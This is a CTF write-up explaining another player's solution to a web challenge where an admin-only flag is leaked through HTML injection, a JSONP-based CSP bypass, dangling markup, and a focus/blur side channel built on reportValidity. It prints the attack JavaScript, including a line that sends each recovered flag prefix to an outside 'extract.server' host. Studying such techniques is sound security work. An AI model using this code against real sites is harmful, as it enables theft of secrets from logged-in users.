This writeup is based on my understanding of [Terjanq solution](https://gist.github.com/terjanq/cd146e97fac07db1c15e6037af7644e0), I didn't solved the challenge in the competition neither after the competition.

Some **Terjanq** words

### Chall:
1. The flag was in the body of the page in form of `<strike>CTF-BR{flag}</strike>` visible only to admin.
2. There was a simple HTML Injection endpoint that happened before the flag.
3. The goal was to retrieve that flag by sending a URL to the page to admin.

### Rules:
1. CSP: `default-src 'none'; script-src 'self'; form-action 'none'; base-uri 'none'; sandbox allow-scripts;`
2. Blocked characters in HTML Injection: `/[:&%#]/`
3. Allowed characters in JSONP: `/^[a-z.]+$/`

___

### The constraints:

There are multiple constraints which make us unable to leak the flag from the admin.

* We can't run injectable javascript using the `name` parameter since CSP will block it.
* We can run some javascript which will be not blocked, using the JSONP callback. But this javascript code is very limited. So we can't do thing like `fetch('my-server.com/?leak=' + flag)`

Here is when `Solution part 0.` comes in. We'll redirect the admin to a page that we own, in that page, we'll have the **Terjanq** solution.

___

### Escenario now has changed. The admin is on a page that we control.

I'll try to explain some technical stuff which are used in the solution.

#### reportValidity
Let's assume we have something like this.
```html
<input id=x value='my-flag' pattern='my-f[^b].*'>
```
The pattern is asking for a prefix `my-f` then any character which is not a `b`, finally, any character. So if we run:
```javascript
ok = document.getElementById('x').reportValidity()
```
The value of *ok* will be `true` since the pattern matches.

Another thing to take in count is, if the pattern doesn't match, the element `x` will gain focus.

#### Dangling markup

[What is dangling markup injection?](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)

With this injection we'll capture the flag inside the value of an input tag.

https://scriptless.world/?name=%3Cinput+value=%27 If we inspect the source code of that page. We'll see that a big part of the HTML content is inside of the value attribute. Note that the flag part is inside it.
___


If we now check the `go` function
``` javascript
async function go(prefix){
    for(let c of alph){
        let r = await test(prefix, c);
        if(r) {
            prefix += c;
            fetch('https://extract.server/x?f='+prefix)
            go(prefix);
            break;
        }
    }
}
```

It will try different patterns for the flag. With each pattern, it will run the `test` function:
```javascript
async function test(prefix, letter){
    return new Promise(r=>{
        let x = document.createElement('iframe');
        document.body.appendChild(x);

        x.focus();
        let win = x.contentWindow;
        let doc = x.contentDocument;
        win.onblur = () => r(1);
        let i = doc.createElement('iframe');
        i.src = URL.replace('PREFIX', prefix).replace('LETTER', letter)
        doc.documentElement.appendChild(i);
        i.onload = () => {
            console.log(/load/);
            r(0);
            x.remove();
        }
    })
}
```
Let see what the `test` functions does:

1. It will create an iframe, lets call it `x`
2. It will give focus to this iframe.
3. It will add a function to the event `onblur` which will end the promise with the value of `1`.
4. It will create a new iframe, let's call it `i`, inside the iframe `x`.
5. It will load the iframe `i` with the `URL` variable.

**Lets stop a moment here**
The URL variable is used for multiple purposes

1. URL will load the scriptless.world page. This page will have the flag in the HTML code.
2. Using the JSONP, URL will make it able to run `x.reportValidity()`. Note here that it'll be call with a string as a parameter, but this doesn't matter.
3. URL will inject a HTML tag. `<input id=x pattern='a pattern here' value='`. Note that the tag isn't close and also the `value` attribute has only one single quote. Here is when [dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) comes into the game.
4. Because of the dangling markup. The value of the input `x` will have a lot of trash, the flag and finally more trash. (That's why URL has a long pattern, it's to match the trash before the flag)

To summarize, URL will:
* Inject an input tag with a pattern and a value. The value contains the flag.
* Inject a script with the JSONP call, which will run reportValidity.

Getting back to the test function, after the step 5, there are two thing that could happen:

* If the current pattern doesn't match. (Note the way the pattern is made), `reportValidity` will return false and iframe `i` will gain focus, so iframe `x` loses focus, which will trigger the `onblur` event returning a `1`.
* If the current pattern does match. It'll be because the current prefix of the flag isn't correct. So the Promise response will be `0`.

Finally everytime the prefix is updated, the `go` function makes a fetch to a server of our property to look into the logs for the flag.


## Some resources that I used to understand the solution
* [JavaScript Promises In 10 Minutes](https://www.youtube.com/watch?v=DHvZLI7Db8E)
* [JavaScript Async Await](https://www.youtube.com/watch?v=V_Kr9OSfDeU)
* [reportValidity](https://googlechrome.github.io/samples/report-validity/)
* [Dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
